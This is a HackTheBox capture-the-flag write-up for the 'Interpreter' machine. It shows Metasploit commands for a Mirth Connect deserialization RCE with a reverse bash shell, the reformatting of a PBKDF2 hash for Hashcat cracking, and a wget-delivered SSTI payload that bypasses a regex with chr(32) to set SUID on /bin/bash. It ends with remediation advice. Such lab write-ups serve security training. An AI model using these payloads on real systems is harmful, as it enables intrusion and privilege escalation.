---

```markdown
# HackTheBox Writeup: Interpreter

**OS:** Linux (Debian 12)  
**Platform:** HackTheBox  
**Difficulty:** Medium / Hard *(опционально, укажи нужную)* **Attack Chain:** RCE (CVE-2023-43208) -> Database Enumeration -> Custom Hash Cracking -> Kernel Exploit Rabbit Hole -> Source Code Review -> SSTI with Regex Bypass -> Root.

## 📝 Overview
This machine presented a highly realistic corporate environment. The initial access involved exploiting a Java deserialization vulnerability in Mirth Connect. Post-exploitation required deep database enumeration to extract and reconstruct complex PBKDF2 hashes. The privilege escalation phase was a great lesson in avoiding "rabbit holes" (kernel exploits) and relying on solid source code review to exploit an SSTI vulnerability with strict input filtering.

---

## 🚪 1. Initial Access (Mirth Connect RCE)
During the initial enumeration, I identified **Mirth Connect version 4.4.0** running on the target. This specific version is vulnerable to **CVE-2023-43208**, an unauthenticated Remote Code Execution (RCE) vulnerability stemming from insecure deserialization.

Using a Metasploit module (and overcoming some payload delivery issues caused by restricted outbound ports), I successfully executed a reverse bash shell and gained initial access as the `mirth` user.

```bash
msf> use exploit/multi/http/mirth_connect_cve_2023_43208
msf> set payload cmd/unix/reverse_bash
msf> exploit
# Session opened (mirth)

```

---

## 🕵️‍♂️ 2. Lateral Movement: Database Enumeration & Hash Cracking

As the `mirth` user, I performed local enumeration and discovered the application's configuration file at `/usr/local/mirthconnect/conf/mirth.properties`. This file contained plaintext credentials for the MariaDB database:

* **User:** `mirthdb`
* **Password:** `MirthPass123!`

I connected to the local MariaDB instance and enumerated the `mc_bdd_prod` database. I found two interesting tables: `PERSON` and `PERSON_PASSWORD`.
The `PERSON` table revealed a system user named `sedric` (ID: 2). The `PERSON_PASSWORD` table contained a Base64-encoded string: `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`.

**The Cryptography Challenge:**
Mirth Connect 4.4+ uses **PBKDF2-HMAC-SHA256** with 600,000 iterations. Unlike standard databases that separate the hash and the salt, the developers concatenated them into a single 40-byte string (8-byte salt + 32-byte hash) and encoded it in Base64.

To crack this, I decoded the Base64 to HEX, sliced the first 16 HEX chars (salt) and the remaining 64 chars (hash), and re-encoded them to Base64 to match Hashcat's expected format (mode 10900).

```text
# Hashcat Format: sha256:iterations:base64_salt:base64_hash
sha256:600000:u/+LBBOUnac=:YshQbDdQCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=

```

Using Hashcat and `rockyou.txt`, the password was cracked in minutes: `snowflake1`. I used this password to SSH into the machine as `sedric` and captured the user flag.

---

## 🚀 3. Privilege Escalation

### 🕳️ The Rabbit Hole (Kernel Exploit)

Upon checking `uname -a`, I noticed the system was running **Linux 6.1.0-43-amd64** (Debian 12). This exact kernel version is vulnerable to the recent **CVE-2026-31431 (Copy Fail)** exploit in the `algif_aead` subsystem.

I downloaded a Python PoC and executed it. However, the exploit failed with `su: Authentication failure`. This was a valuable lesson: *always prioritize local misconfigurations over unstable kernel exploits.* The environment was likely patched or incompatible, so I returned to my standard enumeration methodology.

### 🎯 The Real Path: Source Code Review & SSTI

I uploaded and ran `linpeas.sh`, which highlighted a custom Python script: `/usr/local/bin/notif.py`. This script was running as `root` and listening locally on port `54321`.

Reviewing the source code revealed it was a notification server accepting XML data. The vulnerability lay in a dangerous combination of f-strings and the `eval()` function:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old..."
return eval(f"f'''{template}'''")

```

This is a textbook **Server-Side Template Injection (SSTI)**. If I could inject Python code into the `firstname` XML tag, `eval()` would execute it as root.

**The Filter Bypass:**
The script implemented a Regex filter: `^[a-zA-Z0-9._'\"(){}=+/]+$`. This strictly prohibited spaces (`\s`), meaning a standard payload like `{os.system('chmod +s /bin/bash')}` would be rejected.

To bypass this, I dynamically generated the space character using Python's `chr(32)` function. The `os` module was already imported by the script, which made exploitation straightforward.

**Payload Execution:**
Since `curl` was not installed, I used `wget` to send the crafted XML POST request locally:

```bash
wget --header="Content-Type: application/xml" --post-data='<patient>
    <firstname>{os.system("chmod"+chr(32)+"+s"+chr(32)+"/bin/bash")}</firstname>
    <lastname>A</lastname>
    <sender_app>B</sender_app>
    <timestamp>C</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
</patient>' [http://127.0.0.1:54321/addPatient](http://127.0.0.1:54321/addPatient) -O -

```

The server processed the XML, bypassed the Regex, evaluated the injected command, and set the SUID bit on `/bin/bash`.

```bash
sedric@interpreter:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Sep  6  2025 /bin/bash

sedric@interpreter:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
68f12ee3cdc********************

```

Machine Rooted! 🚩

---

## 🛡️ Takeaways & Remediation

1. **Insecure Deserialization:** Ensure platforms like Mirth Connect are consistently patched and not exposed to untrusted networks.
2. **Database Cryptography:** While combining salt and hash makes database structures simpler, it does not prevent offline cracking if the underlying algorithm (PBKDF2 with weak passwords) is weak. Enforce strong password policies.
3. **Avoid `eval()`:** The use of `eval()` on user-controlled input (even partially filtered) is extremely dangerous. Use safe templating engines (like Jinja2) instead of string formatting and `eval()`.
4. **Defense in Depth:** Regex client/server-side validation is rarely bulletproof. Attackers can find encoding tricks (like `chr(32)`) to bypass character restrictions.
